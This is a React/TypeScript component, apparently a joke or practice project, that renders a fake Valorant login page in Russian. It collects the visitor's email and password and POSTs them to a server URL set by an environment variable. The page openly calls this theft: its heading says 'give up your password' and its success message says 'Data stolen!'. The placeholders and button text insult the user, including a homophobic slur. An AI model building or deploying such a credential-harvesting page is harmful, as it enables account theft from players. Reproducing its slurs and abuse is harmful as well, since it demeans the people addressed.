import { SubmitHandler, useForm } from 'react-hook-form'
import styles from './App.module.css'
import { useState } from 'react'


interface IFormState {
	password: string
	email: string
}

function App() {

  const {register, handleSubmit, reset} = useForm<IFormState>()

  const [isSuccess, setIsSuccess] = useState(false)
  const [isLoading, setIsLoading] = useState(false)

  const onSubmit: SubmitHandler<IFormState> = data => {
    setIsLoading(true)
    fetch(`${process.env.REACT_APP_API_URL}`, {
      method: 'POST',
      headers: {
        'Content-Type' : 'application/json',
      },

      body: JSON.stringify(data),
    }).then(response => 
      response.json()
    ).then( data => {
      if (!data) return

      setIsSuccess(true)
      reset()
    })
    .finally(() => {
      setIsLoading(false)
    })
  }
  return (
    <div className={styles.wrapper}>
      <form onSubmit={handleSubmit(onSubmit)}>
        {isSuccess ? (
          <div className={styles.success}>Данные спизжены!</div>
        ) : (
        <>
          <h1>Valorant - отдай свой пароль</h1>
          <input 
            type="email"
            placeholder='Введи почту уебан:'
            {...register('email')}
          />
          <input
            type="password"
            placeholder='Введи пароль уебан:'
            {...register('password')}
          />
          <button disabled={isLoading}>{isLoading ? 'Подожди пидр': 'Хочу в ебало'}</button>
        </>
        )}
      </form>
    </div>
  )
}

export default App
